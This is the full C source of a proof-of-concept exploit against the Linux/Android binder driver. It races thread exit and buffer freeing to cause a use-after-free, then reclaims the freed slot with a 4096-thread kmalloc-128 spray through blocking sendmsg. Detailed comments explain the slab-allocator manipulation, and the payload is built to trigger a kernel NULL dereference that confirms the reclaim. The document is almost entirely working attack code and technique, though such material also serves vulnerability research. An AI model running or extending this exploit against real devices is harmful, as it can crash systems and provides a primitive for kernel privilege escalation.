poc_results.full_source:
#define _GNU_SOURCE

#include <assert.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

/* Exploit constants */
#define BINDER_DEV "/dev/binder"
#define MAP_SIZE                                                               \
  (0x400000) /* 4 MiB — binder_mmap's cap; absorbs in-flight txns            \
                under spray contention so binder_alloc_new_buf                 \
                doesn't ENOSPC and starve the race. */
#define N_BINDER_OBJECTS 8
#define N_CLIENT_THREADS 4
#define SPRAY_SIZE 128
#define BINDER_WORK_TRANSACTION 1
#define SPRAY_THREADS 4096
#define SPRAY_SOCKETS 32
#define SPRAY_PER_SOCKET (SPRAY_THREADS / SPRAY_SOCKETS) /* 128 */
#define SPRAY_STACK_SIZE (16 * 1024)
#define MAX_GAP_US                                                             \
  5000 /* upper bound for sender idle gap & drainer cadence                    \
        */

/* Cosmetics */
#define ANSI_COLOR_CYAN "\x1b[36m"
#define ANSI_COLOR_GREEN "\x1b[32m"
#define ANSI_COLOR_RESET "\x1b[0m"
#define ANSI_COLOR_RED "\033[1;31m"
#define INFO_PRINT ANSI_COLOR_CYAN "[*] " ANSI_COLOR_RESET
#define SUCCESS_PRINT ANSI_COLOR_GREEN "[!] " ANSI_COLOR_RESET
#define ERORR_PRINT ANSI_COLOR_RED "[X] " ANSI_COLOR_RESET

/* Binder defines... */
struct binder_transaction_data {
  /* The first two are only used for bcTRANSACTION and brTRANSACTION,
   * identifying the target and contents of the transaction.
   */
  union {
    /* target descriptor of command transaction */
    uint32_t handle;
    /* target descriptor of return transaction */
    uint64_t ptr;
  } target;
  uint64_t cookie; /* target object cookie */
  uint32_t code;   /* transaction command */

  /* General information about the transaction. */
  uint32_t flags;
  pid_t sender_pid;
  uid_t sender_euid;
  uint64_t data_size;    /* number of bytes of data */
  uint64_t offsets_size; /* number of bytes of offsets */

  /* If this transaction is inline, the data immediately
   * follows here; otherwise, it ends with a pointer to
   * the data buffer.
   */
  union {
    struct {
      /* transaction data */
      uint64_t buffer;
      /* offsets from buffer to flat_binder_object structs */
      uint64_t offsets;
    } ptr;
    uint8_t buf[8];
  } data;
};

struct binder_write_read {
  uint64_t write_size;     /* bytes to write */
  uint64_t write_consumed; /* bytes consumed by driver */
  uint64_t write_buffer;
  uint64_t read_size;     /* bytes to read */
  uint64_t read_consumed; /* bytes consumed by driver */
  uint64_t read_buffer;
};

struct binder_object_header {
  uint32_t type;
};

struct flat_binder_object {
  struct binder_object_header hdr;
  uint32_t flags;
  union {
    uint64_t binder; // used when type == BINDER_TYPE_BINDER
    uint32_t handle; // used when type == BINDER_TYPE_HANDLE
  };
  uint64_t cookie;
};

struct transaction_data {
  uint32_t cmd;
  struct binder_transaction_data tr;
} __attribute__((packed));

/* Uses the structs and therefore put below... */
#define BINDER_TYPE_BINDER 0x73622a85
#define BINDER_TYPE_HANDLE 0x72622a85
#define BINDER_THREAD_EXIT _IOW('b', 8, int32_t)
#define BC_TRANSACTION _IOW('c', 0, struct binder_transaction_data)
#define BC_FREE_BUFFER _IOW('c', 3, uint64_t)
#define BINDER_WRITE_READ _IOWR('b', 1, struct binder_write_read)
#define BC_ENTER_LOOPER _IO('c', 12)
#define BINDER_SET_CONTEXT_MGR _IOW('b', 7, int32_t)
#define BR_NOOP _IO('r', 12)
#define BR_TRANSACTION_COMPLETE _IO('r', 6)
#define BR_TRANSACTION _IOR('r', 2, struct binder_transaction_data)
#define BR_REPLY _IOR('r', 3, struct binder_transaction_data)
#define TF_ONE_WAY (1)

/* Binder helpers */
int __binder_setup(void) {
  int fd = open(BINDER_DEV, O_RDWR | O_CLOEXEC);
  assert(MAP_FAILED != mmap(NULL, MAP_SIZE, PROT_READ, MAP_PRIVATE, fd, 0));
  return fd;
}

void __become_ctx_manager(int fd) {
  uint32_t dummy = 0;
  ioctl(fd, BINDER_SET_CONTEXT_MGR, &dummy);
}

void __enter_looper(int fd) {
  uint32_t cmd = BC_ENTER_LOOPER;
  struct binder_write_read bwr = {
      .write_size = sizeof(cmd),
      .write_buffer = (uintptr_t)&cmd,
  };
  ioctl(fd, BINDER_WRITE_READ, &bwr);
}

void __free_buffer(int fd, uint64_t buffer_ptr) {
  struct {
    uint32_t cmd;
    uint64_t ptr;
  }
  __attribute__((packed)) free_cmd = {.cmd = BC_FREE_BUFFER, .ptr = buffer_ptr};
  struct binder_write_read bwr = {.write_size = sizeof(free_cmd),
                                  .write_buffer = (uintptr_t)&free_cmd};

  ioctl(fd, BINDER_WRITE_READ, &bwr);
}

void __read_buffers_and_free(int fd) {
  /* The client sends its data, and we need to read the
   * buffer pointer in order to pass it in BC_FREE_BUFFER
   * for the race.
   *
   * Bigger read_buf so we drain ~50 BR_TRANSACTIONs per ioctl instead of ~3;
   * otherwise ctx_mgr falls behind under spray contention and the target
   * binder buffer ENOSPC's, killing race opportunities.
   */
  uint8_t read_buf[4096] = {
      0,
  };
  struct binder_write_read bwr = {.read_size = sizeof(read_buf),
                                  .read_buffer = (uintptr_t)read_buf};
  ioctl(fd, BINDER_WRITE_READ, &bwr);

  /* Parse each command, and free
   * every buffer passed.
   */
  uint8_t *cur = read_buf;
  uint8_t *end = read_buf + bwr.read_consumed;
  while (cur < end) {
    uint32_t cmd = *(uint32_t *)cur;
    cur += sizeof(uint32_t);
    if (cmd == BR_TRANSACTION) {
      struct binder_transaction_data *td =
          (struct binder_transaction_data *)cur;
      __free_buffer(fd, td->data.ptr.buffer);
    }

    cur += _IOC_SIZE(cmd);
  }
}

void __send_multi_object_transaction(int fd, int target, uint64_t binder_base) {
  struct flat_binder_object objs[N_BINDER_OBJECTS];
  uint64_t offsets[N_BINDER_OBJECTS];

  for (int i = 0; i < N_BINDER_OBJECTS; i++) {
    objs[i] = (struct flat_binder_object){
        .hdr.type = BINDER_TYPE_BINDER,
        .flags = 0x7f | (1 << 8),
        .binder = binder_base + i,
        .cookie = 0,
    };
    offsets[i] = i * sizeof(struct flat_binder_object);
  }

  struct transaction_data data = {
      .cmd = BC_TRANSACTION,
      .tr.target.handle = target,
      .tr.code = 1,
      .tr.flags = TF_ONE_WAY,
      .tr.data_size = sizeof(objs),
      .tr.offsets_size = sizeof(offsets),
      .tr.data.ptr.buffer = (uintptr_t)objs,
      .tr.data.ptr.offsets = (uintptr_t)offsets,
  };

  struct binder_write_read bwr = {
      .write_size = sizeof(data),
      .write_buffer = (uintptr_t)&data,
  };

  ioctl(fd, BINDER_WRITE_READ, &bwr);
}

/* Synchronization logic */
int sync_pipe[2];

void pipe_signal(void) {
  char byte = 1;
  write(sync_pipe[1], &byte, 1);
}

void pipe_wait(void) {
  char byte;
  read(sync_pipe[0], &byte, 1);
}

void __pin_to_cpu(int cpuid) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpuid, &set);
  sched_setaffinity(0, sizeof(set), &set);
}

/*
 * Spray CPU 0's kmalloc-128 via blocking sendmsg.
 *
 * Each sender thread loops:
 *   sendmsg(blocking)            ← sock_kmalloc(ctl_buf=128); blocks in
 *                                  sock_wait_for_wmem with ctl_buf still live
 *   <drainer wakes us>           ← sendmsg completes; sock_kfree_s frees
 * ctl_buf usleep(rand() % MAX_GAP_US)  ← idle gap: no spray allocs happen on
 * CPU 0
 *
 * One drainer thread loops:
 *   usleep(rand() % MAX_GAP_US)
 *   recvmsg(g_spray_socks[rand][0], MSG_DONTWAIT)
 *
 * Why this shape:
 *  - Held allocations (1024 of them) drain CPU 0 past its active slab and into
 *    the per-CPU partial list. After init, every fresh sender alloc goes
 *    through __slab_alloc's per-CPU partial branch — exactly where
 * binder_node's slab lands when ctx_mgr's kfree fires (put_cpu_partial pushes
 * to head of the freeing CPU's partial list).
 *  - The randomized idle gap is the key against LIFO recycling: if the sender
 *    re-sendmsg'd immediately, its just-freed slab would be at c->partial.head
 *    and it would pop its OWN slot back. The gap leaves c->partial.head
 *    undisturbed, so a binder_node kfree during the gap leaves S_bn at head
 *    until the next sender alloc captures it.
 *  - 16 sockets because sock_kmalloc charges against sk->sk_omem_alloc with
 *    sysctl_optmem_max = 20480 default. 64 senders × 128 B = 8 KiB per socket,
 *    well under the cap; one socket couldn't hold all 1024 ctl_bufs.
 *
 * Payload: the entire 128-byte slot is zeroed except:
 *   ctl[0..7]   = cmsg_len  = 128  (required ≥ sizeof(cmsghdr) or __scm_send
 * -EINVAL) ctl[24..27] = BINDER_WORK_TRANSACTION = 1 cmsg_level=0 (≠
 * SOL_SOCKET) so __scm_send hits `continue` and doesn't bail.
 *
 * After reclaim, binder_release_work computes
 *     t = container_of(w, struct binder_transaction, work) = slot + 0
 * and binder_cleanup_transaction's first statement
 *     if (t->buffer->target_node && ...)
 * derefs t->buffer at slot+80 — which we zeroed → NULL deref → clean oops/panic
 * that confirms the reclaim landed. (t->debug_id at slot+0 reads 0x80 = 128
 * from cmsg_len's low byte; it's only printed, not dereferenced.)
 */
static int g_spray_socks[SPRAY_SOCKETS][2];

void *__sender_thread_fn(void *arg) {
  int sock_idx = (int)(uintptr_t)arg;
  __pin_to_cpu(0);

  uint8_t ctl[SPRAY_SIZE];
  memset(ctl, 0, sizeof(ctl));
  struct cmsghdr *cmsg = (struct cmsghdr *)ctl;
  cmsg->cmsg_len = SPRAY_SIZE;
  cmsg->cmsg_level = 0;
  cmsg->cmsg_type = 0;
  *(uint32_t *)(ctl + 24) = BINDER_WORK_TRANSACTION;

  char b = 'x';
  struct iovec iov = {.iov_base = &b, .iov_len = 1};
  struct msghdr msg = {
      .msg_iov = &iov,
      .msg_iovlen = 1,
      .msg_control = ctl,
      .msg_controllen = sizeof(ctl),
  };

  unsigned int seed = (unsigned int)(uintptr_t)pthread_self();

  for (;;) {
    sendmsg(g_spray_socks[sock_idx][1], &msg, 0);
    usleep(rand_r(&seed) % MAX_GAP_US);
  }
  return NULL;
}

void *__drainer_thread_fn(void *arg) {
  (void)arg;
  unsigned int seed = 0xc0ffeeu;

  uint8_t buf[256];
  uint8_t cbuf[256];
  struct iovec iov = {.iov_base = buf, .iov_len = sizeof(buf)};
  struct msghdr msg = {
      .msg_iov = &iov,
      .msg_iovlen = 1,
      .msg_control = cbuf,
      .msg_controllen = sizeof(cbuf),
  };

  for (;;) {
    usleep(rand_r(&seed) % MAX_GAP_US);
    int idx = rand_r(&seed) % SPRAY_SOCKETS;
    recvmsg(g_spray_socks[idx][0], &msg, MSG_DONTWAIT);
  }
  return NULL;
}

void __spray_kmalloc_128(void) {
  /* Create the socket fleet and pre-fill each peer's wmem so subsequent
   * sendmsg() blocks in sock_wait_for_wmem (where ctl_buf stays alive).
   */
  char b = 'x';
  struct iovec iov = {.iov_base = &b, .iov_len = 1};
  struct msghdr fill = {.msg_iov = &iov, .msg_iovlen = 1};

  for (int i = 0; i < SPRAY_SOCKETS; i++) {
    assert(0 == socketpair(AF_UNIX, SOCK_DGRAM, 0, g_spray_socks[i]));
    while (sendmsg(g_spray_socks[i][1], &fill, MSG_DONTWAIT) >= 0)
      ;
  }

  pthread_attr_t attr;
  pthread_attr_init(&attr);
  pthread_attr_setstacksize(&attr, SPRAY_STACK_SIZE);

  pthread_t senders[SPRAY_THREADS];
  for (int i = 0; i < SPRAY_THREADS; i++) {
    int sock_idx = i / SPRAY_PER_SOCKET;
    pthread_create(&senders[i], &attr, __sender_thread_fn,
                   (void *)(uintptr_t)sock_idx);
  }

  pthread_t drainer;
  pthread_create(&drainer, &attr, __drainer_thread_fn, NULL);

  pthread_attr_destroy(&attr);
  usleep(100000); /* let every sender settle into sock_wait_for_wmem */
  printf(INFO_PRINT
         "Spraying kmalloc-128: %d senders across %d sockets, drainer "
         "cycling ≤ %d us\n",
         SPRAY_THREADS, SPRAY_SOCKETS, MAX_GAP_US);
}

void _ctx_manager_race(void) {
  __pin_to_cpu(0);

  printf(INFO_PRINT "Initializing ctx mgr fd...\n");
  int fd = __binder_setup();
  __become_ctx_manager(fd);
  __enter_looper(fd);
  printf(INFO_PRINT "Became context manager, signaling client...\n");
  printf(INFO_PRINT
         "Server will now free every buffer it gets, good luck to us...\n");

  /* Signal client to initialize itself and sync */
  pipe_signal();

  for (;;) {
    __read_buffers_and_free(fd);
  }
}

static int g_client_fd;

void *__client_thread_fn(void *arg) {
  uint64_t binder_base = (uint64_t)(uintptr_t)arg;
  for (;;) {
    int n_fd = dup(g_client_fd);
    __send_multi_object_transaction(n_fd, 0, binder_base);
    /* Race: close fd → binder_deferred_release → binder_release_work */
    ioctl(n_fd, BINDER_THREAD_EXIT, 0);
    close(n_fd);
  }
  return NULL;
}

void _client_race(void) {
  __pin_to_cpu(1);

  printf(INFO_PRINT "Initializing client fd...\n");
  g_client_fd = __binder_setup();
  pipe_wait();

  __spray_kmalloc_128();

  pthread_t threads[N_CLIENT_THREADS];
  for (int i = 0; i < N_CLIENT_THREADS; i++) {
    uint64_t base = 0xdeadbeef + 0x1000 * i;
    pthread_create(&threads[i], NULL, __client_thread_fn,
                   (void *)(uintptr_t)base);
  }

  for (int i = 0; i < N_CLIENT_THREADS; i++) {
    pthread_join(threads[i], NULL);
  }
}

int main(void) {
  pipe(sync_pipe);

  pid_t pid = fork();
  if (0 == pid) {
    /* Child process: context manager. */
    _ctx_manager_race();
    exit(0);
  }
  _client_race();
  wait(NULL);
}

